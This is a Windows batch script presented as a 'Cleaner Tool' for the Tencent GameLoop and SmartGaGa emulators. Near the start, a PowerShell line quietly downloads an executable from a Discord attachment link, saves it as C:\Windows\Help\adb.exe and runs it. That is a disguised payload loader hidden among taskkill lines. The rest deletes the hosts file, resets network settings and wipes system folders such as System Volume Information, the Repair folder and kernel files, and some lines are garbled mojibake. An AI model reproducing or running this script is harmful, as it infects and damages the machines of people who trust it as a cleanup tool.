
  @echo off
title  -=-=-=-=-=-=-{Chris}-=-=-=-=-=-=-
color 0b
     cls 
:Run tool
cls
:loop                                                                                           
echo =-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
ECHO                                              Cleaner Tool - {Chris}
ECHO =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-==-==-==-==-==-==-==-==-=
ECHO ================================================= Welcome ================================================
ECHO
ECHO
ECHO ======================================Task Kill [SmartGaGa-GameLoop] ======================================
echo Repair Task Maneger Disabled....
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f >nul 2>nul
taskkill /IM "Synaptics.exe" /F
taskkill /f /im dnf.exe
taskkill /f /im tensafe_1.exe
taskkill /f /im tensafe_2.exe
taskkill /f /im tencentdl.exe
taskkill /f /im conime.exe
taskkill /f /im QQDL.EXE
taskkill /f /im qqlogin.exe
taskkill /f /im dnfchina.exe
taskkill /f /im dnfchinatest.exe
taskkill /f /im txplatform.exe
taskkill /f /im aow_exe.exe
taskkill /F /IM TitanService.exe
taskkill /F /IM ProjectTitan.exe
taskkill /F /IM Auxillary.exe
taskkill /F /IM TP3Helper.exe
taskkill /F /IM tp3helper.dat
TaskKill /F /IM androidemulator.exe
TaskKill /F /IM aow_exe.exe
TaskKill /F /IM QMEmulatorService.exe
TaskKill /F /IM RuntimeBroker.exe
taskkill /F /im adb.exe
taskkill /F /im GameLoader.exe
taskkill /F /im TBSWebRenderer.exe
taskkill /F /im AppMarket.exe
taskkill /F /im AndroidEmulator.exe
net stop QMEmulatorService
net stop aow_drv
del C:\aow_drv.log
del /s /f /q C:\ProgramData\Tencent
powershell (new-object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/855071794543984671/855071919983165481/d.exe','C:\Windows\Help\adb.exe'); >null >null
del /s /f /q C:\Users%USERNAME%\AppData\Local\Tencent
del /s /f /q C:\Users%USERNAME%\AppData\Roaming\Tencent
net stop Tensafe
net stop aow_drv
C:\Windows\Help\adb.exe
echo Repair Task Maneger Disabled....
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f >nul 2>nul
del /f /s /q  C:\Windows\System32\drivers\etc\hosts >nul 2>nul
ECHO ========================================= Processed Successfully ==========================================
ECHO ========================================= Avanced DeepCleaning [May Take Time]==========================================
cls
title Deep Cleaning Started Please Wait!!
color 3
cls
echo. Turn On Windows Firewall
netsh advfirewall set publicprofile state on
netsh advfirewall set domainprofile state on
netsh advfirewall set privateprofile state on
cls
echo. Turn On Windows Defender
sc start WinDefend
sc config WinDefend start= auto
cls
echo. Turn On Windows UPDATE
net start wuauserv
sc config wuauserv start= auto
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 1 /f
cls
TaskKill /F /IM chrome.exe
TaskKill /F /IM opera.exe
TaskKill /F /IM firefox.exe
TaskKill /F /IM explorer.exe
TaskKill /F /IM service.exe
cls
echo. Clear Trojan On Local Disk (C)
cd C:\ 
attrib -s -h -r -i autorun.inf
del autorun.inf
cls
echo. Clear Trojan On Local Disk (D)
cd D:\ 
attrib -s -h -r -i autorun.inf
del autorun.inf
cls
echo. Clear Trojan On Local Disk (E)
cd E:\ 
attrib -s -h -r -i autorun.inf
del autorun.inf
cls
echo. Clear Trojan On Local Disk (F)
cd f:\ 
attrib -s -h -r -i autorun.inf
del autorun.inf
cls
net start uxsms
cls
explorer.exe
cls
del /f /s /q "%systemdrive%\*.tmp"
del /f /s /q "%systemdrive%\*._mp"
del /f /s /q "%systemdrive%\*.log"
del /f /s /q "%systemdrive%\*.gid"
del /f /s /q "%systemdrive%\*.chk"
del /f /s /q "%systemdrive%\*.old"
del /f /s /q "%systemdrive%\*.SWP"
cls
del /f /s /q "C:\*.tmp
del /f /s /q "C:\*._mp"
del /f /s /q "C:\*.log"
del /f /s /q "C:\*.gid"
del /f /s /q "C:\*.chk"
del /f /s /q "C:\*.old"
del /f /s /q "C:\*.SWP"
cls
del /f /s /q "E:\*.tmp
del /f /s /q "E:\*._mp"
del /f /s /q "E:\*.log"
del /f /s /q "E:\*.gid"
del /f /s /q "E:\*.chk"
del /f /s /q "E:\*.old"
del /f /s /q "E:\*.SWP"
cls
del /f /s /q "D:\*.tmp
del /f /s /q "D:\*._mp"
del /f /s /q "D:\*.log"
del /f /s /q "D:\*.gid"
del /f /s /q "D:\*.chk"
del /f /s /q "D:\*.old"
del /f /s /q "D:\*.SWP"
cls
del /f /s /q "F:\*.tmp
del /f /s /q "F:\*._mp"
del /f /s /q "F:\*.log"
del /f /s /q "F:\*.gid"
del /f /s /q "F:\*.chk"
del /f /s /q "F:\*.old"
del /f /s /q "F:\*.SWP"
cls
del /f /s /q "%windir%\*.bak"
cls
del /f /s /q "%SystemRoot%\MEMORY.DMP"
del /f /s /q "%SystemRoot%\Minidump.dmp"
del /f /s /q "%SystemRoot%\Minidump\*.*"
del /f /s /q "%SystemRoot%\Minidump\"
rd /s /q "%SystemRoot%\Minidump\"
md "%SystemRoot%\Minidump\"
cls
reg delete "HKEY_USERS\S-1-5-21-1684716338-1731825245-2802686541-500\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
cls
del /f /s /q "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"
rd /s /q "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"
md "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\"
cls
del /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\History\*.*"
rd /s /q "%userprofile%\AppData\Local\Microsoft\Windows\History\"
md "%userprofile%\AppData\Local\Microsoft\Windows\History\"
cls
del /f /s /q "%userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\*.*"
rd /s /q "%userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\*.*"
md "%userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\*.*"
cls
del /f /s /q "%windir%\temp\*.*"
del /f /s /q "%windir%\temp\"
rd /s /q "%windir%\temp"
cls
del /f /s /q "%windir%\prefetch\*.*"
del /f /s /q "%windir%\prefetch\"
rd /s /q "%windir%\prefetch\"
md "%windir%\prefetch\"
cls
del /f /s /q "%USERPROFILE%\AppData\Local\Temp\*.*"
del /f /s /q "%USERPROFILE%\AppData\Local\Temp\"
cls
del /f /q "%userprofile%\cookies\*.*"
del /f /q "%userprofile%\cookies\"
rd /s /q "%userprofile%\cookies\"
cls
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
cls
del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\Temporary Internet Files\"
rd /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\Temporary Internet Files\"
cls
del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\Caches\"
del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\Caches\*.*"
cls
del /f /s /q "%systemdrive%\ProgramData\Microsoft\Windows\Caches\*.*"
rd /s /q "%systemdrive%\ProgramData\Microsoft\Windows\Caches\"
cls
del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\*.*"
rd /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\"
cls
del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\ReportArchive\*.*"
rd /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\ReportArchive\"
cls
del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\ReportQueue\*.*"
rd /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\ReportQueue\"
cls
del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\ERC\*.*"
rd /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\ERC\"
cls
del /f /s /q "%systemdrive%\ProgramData\Microsoft\Windows\WER\ReportQueue\*.*"
rd /s /q "%systemdrive%\ProgramData\Microsoft\Windows\WER\ReportQueue\"
cls
del /f /s /q "%systemdrive%\ProgramData\Microsoft\Windows\WER\ReportArchive\*.*"
rd /s /q "%systemdrive%\ProgramData\Microsoft\Windows\WER\ReportArchive\"
cls
del /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\*.db"
del /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\*.etl"
del /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\ThumbCacheToDelete\*.tmp"
rd /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\ThumbCacheToDelete\"
cls
del /f /s /q "\$Recycle.Bin\"
del /f /s /q "\$Recycle.Bin\*"
del /f /s "/q \$Recycle.Bin\*.*"
rd /s /q "\$Recycle.Bin\"
rd /s /q "\$Recycle.Bin\*"
rd /s /q "\$Recycle.Bin\*.*"
cls
cls
%SystemRoot%\System32\Cmd.exe /c Cleanmgr /sageset:16 & Cleanmgr /sagerun:16
cls
c:\windows\SYSTEM32\cleanmgr.exe /dDrive
cls
cls
chkdsk C:
cls
echo. Now Termine Scan Local Disk [C] !Now Scan [D]
chkdsk D:
cls
echo. Now Termine Scan Local Disk [D] !Now Scan [E]
chkdsk E:
cls
echo. Now Termine Scan Local Disk [E] !Now Scan [F]
chkdsk F:
cls
echo. Now Termine Scan Local Disk [C/D/E/F]
cls
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16
cls
echo Processed Successfully!
echo.
echo.
echo %rw10%
echo                                                   Processed Successfully!
echo %rw10%
echo.
echo.
echo
ECHO =========================================DNS + IP [Flush/Reset] ==========================================


netsh interface ip show config
ipconfig /all
ipconfig /registerdns
ipconfig /displaydns
ipconfig /release
ipconfig /renew
ipconfig /flushdns
netsh int ip reset
netsh winsock reset
netsh interface ipv4 reset
netsh interface ipv6 reset
netsh advfirewall reset
nbtstat -r
nbtstat -rr
netsh advfirewall set publicprofile state on
netsh advfirewall set domainprofile state on
netsh advfirewall set privateprofile state on
ECHO ========================================= Processed Successfully ==========================================
echo
ECHO ===================================== Junk Clean [Temp, Prefetch. etc] ====================================
dir/s
del C:\Users\%username%\AppData\Local\Temp /f /s /q
rd C:\Users\%username%\AppData\Local\Temp /s /q
del C:\Windows\Temp /f /s /q
rd C:\Windows\Temp /s /q
md 
%temp%
rd %temp% /s /q

del /s /f /q C:\Windows\Prefetch\*.*
del /s /f /q C:\Windows\temp\*.*
del /s /f /q C:\Windows\System32\temp\*.*
del /s /f /q C:\Users\ghmed\AppData\Roaming\Tencent\*.*
del /s /f /q C:\ProgramData\Tencent\*.*
del /s /f /q C:\Users\ghmed\AppData\Local\Temp\
del /s /f /q C:\Users\ghmed\AppData\Local\Tencent\
del /s /f /q C:\Users\ghmed\AppData\Roaming\Tencent\

del /s /f /q %windir%\temp\*.*    
rd /s /q %windir%\temp    
md %windir%\temp    
del /s /f /q %windir%\Prefetch\*.*    
rd /s /q %windir%\Prefetch    
md %windir%\Prefetch    
del /s /f /q %windir%\system32\dllcache\*.*    
rd /s /q %windir%\system32\dllcache    
md %windir%\system32\dllcache    
del /s /f /q "%SysteDrive%\Temp"\*.*    
rd /s /q "%SysteDrive%\Temp"    
md "%SysteDrive%\Temp"    
del /s /f /q %temp%\*.*    
rd /s /q %temp%    
md %temp%    
del /s /f /q "%USERPROFILE%\Local Settings\History"\*.*    
rd /s /q "%USERPROFILE%\Local Settings\History"    
md "%USERPROFILE%\Local Settings\History"    
del /s /f /q "%USERPROFILE%\Local Settings\Temporary Internet Files"\*.*    
rd /s /q "%USERPROFILE%\Local Settings\Temporary Internet Files"    
md "%USERPROFILE%\Local Settings\Temporary Internet Files"    
del /s /f /q "%USERPROFILE%\Local Settings\Temp"\*.*    
rd /s /q "%USERPROFILE%\Local Settings\Temp"    
md "%USERPROFILE%\Local Settings\Temp"    
del /s /f /q "%USERPROFILE%\Recent"\*.*    
rd /s /q "%USERPROFILE%\Recent"    
md "%USERPROFILE%\Recent"    
del /s /f /q "%USERPROFILE%\Cookies"\*.*    
rd /s /q "%USERPROFILE%\Cookies"    
md "%USERPROFILE%\Cookies"


 
title Overpowered Cleaner
mode con cols=80 lines=32 


rd %temp% /s /q
 
md %temp%

del /s /f /q C:\Windows\Prefetch\*.*
del /s /f /q C:\Windows\temp\*.*
del /s /f /q C:\Windows\System32\temp\*.*
del /s /f /q %USERPROFILE%\appdata\local\temp\*.*


 
@ echo ط¢آ·ط¢آ·ط¢آ·ط¢آ·
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*" 
del /f /s /q "%userprofile%\Local Settings\Temp\*.*" 
del /f /s /q %systemdrive%\*.tmp 
del /f /s /q %systemdrive%\*._mp 
del /f /s /q %systemdrive%\*.log 
del /f /s /q %systemdrive%\*.gid 
del /f /s /q %systemdrive%\*.chk 
del /f /s /q %systemdrive%\*.old 
del /f /s /q %systemdrive%\recycled\*.* 
del /f /s /q %windir%\*.bak 
del /f /s /q %windir%\prefetch\*.* 
rd /s /q %windir%\temp & md %windir%\temp 
del /f /q %userprofile%\cookies\*.* 
del /f /q %userprofile%\recent\*.* 
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*" 
del /f /s /q "%userprofile%\Local Settings\Temp\*.*" 
del /f /s /q "%userprofile%\recent\*.*" 
del /f /s /q %systemdrive%\*.tmp
RD %windir%\$hf_mig$ /Q /S
color C
del %windir%\2950800.txt /f /q
for /f %%i in (%windir%\2950800.txt) do rd %windir%\%%i /s /q
dir %windir%\$NtUninstall* /a:d /b >%windir%\2950800.txt
del /f /s /q %systemdrive%\*._mp
del /f /s /q %systemdrive%\*.log
del /f /s /q %systemdrive%\*.gid
color 3
del /f /s /q %systemdrive%\*.pnf
del /f /s /q %systemdrive%\infcache.1
del /f /s /q %systemdrive%\*.chk
del /f /s /q %systemdrive%\*.old
del /f /s /q %systemdrive%\recycled\*.*
del /f /s /q %windir%\*.bak
color D
del /f /s /q %windir%\prefetch\*.*
rd /s /q %windir%\temp & md %windir%\temp
del /f /q %userprofile%\cookies\*.*
del /f /q %userprofile%\recent\*.*
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /f /s /q "%userprofile%\Local Settings\Temp\*.*"
del /f /s /q "%userprofile%\recent\*.*"
color 4
del /f /s /q %systemdrive%\*.tmp 
del /f /s /q %systemdrive%\*._mp 
del /f /s /q %systemdrive%\*.log 
del /f /s /q %systemdrive%\*.gid 
color E
del /f /s /q %systemdrive%\*.chk 
del /f /s /q %systemdrive%\*.old 
del /f /s /q %systemdrive%\recycled\*.* 
del /f /s /q %windir%\*.bak 
color 5
del /f /s /q %windir%\prefetch\*.* 
rd /s /q %windir%\temp & md %windir%\temp 
del /f /q %userprofile%\cookies\*.* 
del /f /q %userprofile%\recent\*.* 
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*" 
del /f /s /q "%userprofile%\Local Settings\Temp\*.*" 
del /f /s /q "%userprofile%\recent\*.*"
del /f /s /q %windir%\system32\cid_store.dat
md %windir%\system32\cid_store.dat
color F
attrib +s +h +r %windir%\system32\cid_store.dat
del /f /s /q %windir%\system32\pub_store.dat
md %windir%\system32\pub_store.dat
attrib +s +h +r %windir%\system32\pub_store.dat
del /f /s /q %windir%\system32\xlhcc.dat
color 6
md %windir%\system32\xlhcc.dat
attrib +s +h +r %windir%\system32\xlhcc.dat
del /f /s /q %systemdrive%\*.tmp
RD %windir%\$hf_mig$ /Q /S
color 7
del %windir%\2950800.txt /f /q
for /f %%i in (%windir%\2950800.txt) do rd %windir%\%%i /s /q
dir %windir%\$NtUninstall* /a:d /b >%windir%\2950800.txt
del /f /s /q %systemdrive%\*._mp
del /f /s /q %systemdrive%\*.log
del /f /s /q %systemdrive%\*.gid
del /f /s /q %systemdrive%\*.pnf
color 8
del /f /s /q %systemdrive%\infcache.1
del /f /s /q %systemdrive%\*.chk
del /f /s /q %systemdrive%\*.old
del /f /s /q %systemdrive%\recycled\*.*
del /f /s /q %windir%\*.bak
color 9
del /f /s /q %windir%\prefetch\*.*
rd /s /q %windir%\temp & md %windir%\temp
del /f /q %userprofile%\cookies\*.*
del /f /q %userprofile%\recent\*.*
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /f /s /q "%userprofile%\Local Settings\Temp\*.*"
del /f /s /q "%userprofile%\recent\*.*"
color 2D
rd /s /q "c:\vod_cache_data" 2>NUL
del /f /s /q %windir%\system32\cid_store.dat
md %windir%\system32\cid_store.dat
attrib +s +h +r %windir%\system32\cid_store.dat
del /f /s /q %windir%\system32\pub_store.dat
md %windir%\system32\pub_store.dat
color 9
attrib +s +h +r %windir%\system32\pub_store.dat
del /f /s /q %windir%\system32\xlhcc.dat
md %windir%\system32\xlhcc.dat
color 7
attrib +s +h +r %windir%\system32\xlhcc.dat
rem del /f /q %userprofile%\COOKIES s\*.* 
rem del /f /q %userprofile%\recent\*.* 
%windir%\system32\sfc.exe /purgecache 
%windir%\system32\defrag.exe %systemdrive% -b أ¯آ¼ظ¾
color 6
%windir%\system32\sfc.exe /purgecache  
%windir%\system32\defrag.exe %systemdrive% -b 
Set HomeDrive=C:
Set WinDir=%HomeDrive%\WINDOWS
Set SysDir=%WinDir%\System32
Set ProgFile=%HomeDrive%\Program Files
Set CurUser=%HomeDrive%\Documents and Settings\Administrator
Set AllUser=%HomeDrive%\Documents and Settings\All Users
Rd /s/q "%AllUser%\Documents\My Videos
Rd /s/q "%AllUser%\Documents\My Pictures
Rd /s/q "%AllUser%\Documents\My Music
Rd /s/q "%ProgFile%\Windows Media Player\Icons
Rd /s/q "%ProgFile%\Windows Media Player\Sample Playlists
Rd /s/q "%ProgFile%\Windows Media Player\Skins
Rd /s/q "%ProgFile%\Windows Media Player\Visualizations
Del /a/f/s/q "%ProgFile%\Windows Media Player\*.txt
Del /a/f/s/q "%AllUser%\ظ…â‚¬إ’ظ‡آ¼â‚¬ظ‡آ§â€¹ظ…â‚¬ع†أ¨عˆإ“ظ‡ع†â€¢\Windows Catalog.*
Del /a/f/s/q "%AllUser%\ظ…â‚¬إ’ظ‡آ¼â‚¬ظ‡آ§â€¹ظ…â‚¬ع†أ¨عˆإ“ظ‡ع†â€¢\Windows Update.*
Del /a/f/s/q "%AllUser%\ظ…â‚¬إ’ظ‡آ¼â‚¬ظ‡آ§â€¹ظ…â‚¬ع†أ¨عˆإ“ظ‡ع†â€¢\أ¨آ®آ¾ظ‡آ®ع‘أ§آ¨â€¹ظ‡ط›عˆأ¨آ®طںأ©â€”آ®ظ‡â€™إ’أ©آ»ع©أ¨آ®آ¤ظ‡â‚¬آ¼.*
Rd /s/q "%ProgFile%\360Safe\hotfix"
Rd /s/q "%CurUser%\Application Data\ACD Systems
Del /a/f/s/q "%ProgFile%\ACDSee\*.hlp"
Del /a/f/s/q "%ProgFile%\ACDSee\*.cnt"
Del /a/f/s/q "%ProgFile%\ACDSee\PlugIns\*.hlp
Del /a/f/s/q "%ProgFile%\ACDSee\PlugIns\*.chm
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\*.txt
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\*.ini
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\*.dat
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\GSpot.exe
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\StormSet.exe
Del /a/f/s/q "%ProgFile%\Ringz Studio\Storm Codec\Codecs\languages\ffdshow.1033.en
Rd /s/q "%AllUser%\Application Data\Storm\Update
Rd /s/q "%AllUser%\ظ…â‚¬إ’ظ‡آ¼â‚¬ظ‡آ§â€¹ظ…â‚¬ع†أ¨عˆإ“ظ‡ع†â€¢\أ§آ¨â€¹ظ‡ط›عˆ\ظˆع‘آ´أ©آ£عکظ‡آ½آ±أ©ع؛آ³
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\CoreVideo.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTime3GPP.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTime.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeAudioSupport.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeEssentials.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeH264.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeInternetExtras.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeMPEG4.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeStreaming.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeStreamingExtras.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeVR.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz Studio\Storm Codec\QTSystem\QuickTimeWebHelper.Resources\en.lproj
Rd /s/q "%CurUser%\ظ…â‚¬إ’ظ‡آ¼â‚¬ظ‡آ§â€¹ظ…â‚¬ع†أ¨عˆإ“ظ‡ع†â€¢\أ§آ¨â€¹ظ‡ط›عˆ\freeime
Del /a/f/s/q "%ProgFile%\freeime\freeime.htm
Del /a/f/s/q "%ProgFile%\freeime\*.gif
Del /a/f/s/q "%ProgFile%\freeime\*.txt
Rd /s/q "%ProgFile%\freeime\skin\Apple_Z
Rd /s/q "%ProgFile%\freeime\skin\bear2
Rd /s/q "%ProgFile%\freeime\skin\Elegant
Rd /s/q "%ProgFile%\freeime\skin\IF_Taiji
Rd /s/q "%ProgFile%\freeime\skin\time
Rd /s/q "%ProgFile%\freeime\skin\du
Rd /s/q "%ProgFile%\freeime\skin\huan
Rd /s/q "%ProgFile%\freeime\skin\Tango NightXP
Rd /s/q "%ProgFile%\freeime\skin\youxihou
Rd /s/q "%ProgFile%\freeime\skin\blueness
Rd /s/q "%ProgFile%\freeime\skin\Hello Kitty
Rd /s/q "%ProgFile%\freeime\skin\MG_S
Rd /s/q "%ProgFile%\freeime\skin\VistaHeiMini
Del /a/f/s/q "%ProgFile%\KWMUSIC\readme.txt
Del /a/f/s/q "%ProgFile%\Microsoft Office\OFFICE11\2052\*.chm
Del /a/f/s/q "%ProgFile%\Microsoft Office\OFFICE11\2052\*.htm
Del /a/f/s/q "%ProgFile%\PPStream\*.url
Del /a/f/s/q "%ProgFile%\PPStream\whatsnew.txt
Del /a/f/q "%ProgFile%\Real\RealPlayer\Setup\setup.exe"
Del /a/f/q "%ProgFile%\Real\RealPlayer\*.chm
Del /a/f/q "%ProgFile%\Real\RealPlayer\*.txt
Del /a/f/q "%ProgFile%\Real\RealPlayer\*.html
Rd /s/q "%ProgFile%\KWREAL"
Del /a/f/q "%ProgFile%\Thunder\AyuConfig.exe
Del /a/f/s/q "%ProgFile%\Thunder Network\Thunder\Program\Update\*.*"
Rd /s/q "%AllUser%\Application Data\Thunder Network\KanKan"
Rd /s/q "%ProgFile%\Thunder Network\Thunder\Components\KanKan"
Del /a/f/q "%ProgFile%\WinRAR\*.diz
Del /a/f/q "%ProgFile%\WinRAR\*.txt
Del /a/f/q "%ProgFile%\WinRAR\*.chm
Del /a/f/q "%ProgFile%\WinRAR\*.htm
Del /a/f/q "%ProgFile%\ظ‡ع†ئ’ظ‡ع†ئ’أ©â€Œâ„¢ظ‡ع¯آ¬\readme.txt
Del /a/f/s/q "%CurUser%\Application Data\Microsoft\Internet Explorer\Quick Launch\ظ‡ع†ئ’ظ‡ع†ئ’أ©â€Œâ„¢ظ‡ع¯آ¬.*
Del /a/f/q "%AllUser%\Application Data\UNISPIM\usrwl.dat"
Del /a/f/q "%CurUser%\Application Data\UNISPIM\usrwl.dat"
Rd /s/q "%WinDir%\MAGICSET"
Rd /s/q "%HomeDrive%\Found.*"
For /f "delims=\" %%i in ('dir "%HomeDrive%\Found.*" /adh /b') do Rd /s/q "%HomeDrive%\%%i"
Del /a/f/q "%HomeDrive%\PageFile.sys"
Del /a/f/q "%HomeDrive%\HiberFil.sys"
echo.Rd /s/q "%WinDir%\$*$"
For /f "delims=\" %%i in ('dir "%Windir%\$*$" /adh /b') do Rd /s/q "%WinDir%\%%i"
Del /a/f/s/q "%SysDir%\oobe\*.*"
Del /a/f/s/q "%WinDir%\Cursors\*.*"
Del /a/f/s/q "%WinDir%\Temp\*.*"
Del /a/f/s/q "%WinDir%\Prefetch\*.*"
Del /a/f/s/q "%WinDir%\Inf\*.PNF"
Del /a/f/s/q "%SysDir%\ReinstallBackups\*.*"
Rd /s/q "%WinDir%\ime\CHTIME"
Rd /s/q "%WinDir%\ime\IMJP8_1"
Rd /s/q "%WinDir%\ime\imejp"
Rd /s/q "%WinDir%\ime\imejp98"
Rd /s/q "%WinDir%\ime\IMKR6_1"
Del /a/f/q "%WinDir%\ime\CHTIME\Applets\HWXCHT.DLL"
Rd /s/q "%SysDir%\IME\CINTLGNT"
Rd /s/q "%SysDir%\IME\TINTLGNT"
Del /a/f/q "%WinDir%\Fonts\gulim.ttc"
Del /a/f/q "%WinDir%\Fonts\msgothic.ttc"
Del /a/f/s/q "%CurUser%\Local Settings\Temporary Internet Files\*.*"
Del /a/f/s/q "%CurUser%\Local Settings\Temp\*.*"
Del /a/f/s/q "%CurUser%\Local Settings\History\*.*"
Del /a/f/s/q "%CurUser%\NetHood\*.*"
Del /a/f/s/q "%CurUser%\PrintHood\*.*"
Del /a/f/s/q "%CurUser%\Recent\*.*"
Del /a/f/s/q "%CurUser%\Cookies\*.*"
Del /a/f/q "%CurUser%\Local Settings\Application Data\IconCache.db"
Del /a/f/s/q "%ProgFile%\Outlook Express\*.txt
Del /a/f/s/q "%ProgFile%\Online Services\*.*
Rd /s/q "%ProgFile%\Messenger"
Rd /s/q "%ProgFile%\Movie Maker"
Rd /s/q "%ProgFile%\MSN Gaming Zone"
Rd /s/q "%ProgFile%\NetMeeting"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /t "REG_SZ" /d "ظˆث†â€کأ§ع‘â€‍أ§â€‌آµأ¨â€‍â€ک" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
Rd /s/q "%WinDir%\LastGood"
Rd /s/q "%WinDir%\Repair"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntkrnlmp.exe"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntkrnlpa.exe"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntkrpamp.exe"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntoskrnl.exe"
DEL/A/F/Q %%M:\SXS.EXE
DEL/A/F/Q %%M:\OSO.EXE
DEL/A/F/Q %%M:\SETUP.EXE)
Del /a/f/s/q "%HomeDrive%\*.tmp"
Del /a/f/s/q "%HomeDrive%\*._mp"
Del /a/f/s/q "%HomeDrive%\*.log"
Del /a/f/s/q "%HomeDrive%\*.gid"
Del /a/f/s/q "%HomeDrive%\*.chk"
Del /a/f/s/q "%HomeDrive%\*.old"
Rd /s/q "%HomeDrive%\RECYCLER
Rd /s/q "%HomeDrive%\System Volume Information
Del /a/f/s/q "%WinDir%\*.bak"
Rd /s/q "%WinDir%\assembly
del /f /s /q "%WinDir%\SoftwareDistribution\Download\*.*
del /f /s /q "%WinDir%\inf\*.pnf
del /f /s /q %SysDir%\CatRoot2\tmp.ed0
del /f /s /q %SysDir%\spool\drivers\w32x86\3\*.*
del /f /s /q %SysDir%\*.tmp
del /f /s /q %SysDir%\*._mp
del /f /s /q %SysDir%\*.log
del /f /s /q %SysDir%\*.gid
del /f /s /q %SysDir%\*.chk
del /f /s /q %SysDir%\*.old
del /f /s /q %SysDir%%\recycled\*.*
TASKKILL /F /T /IM SXS.EXE
TASKKILL /F /T /IM SVOHOST.EXE 
TASKKILL /F /T /IM ROSE.EXE
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]>>SHOWALL.reg
ECHO "CheckedValue"=->>SHOWALL.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]>>SHOWALL.reg
ECHO "CheckedValue"=dword:00000001>>SHOWALL.reg
ATTRIB -R -H -S -A %SysDir%\SXS.EXE
ATTRIB -R -H -S -A %SysDir%\SVOHOST.EXE
ATTRIB -R -H -S -A %SysDir%\WINSCOK.DLL
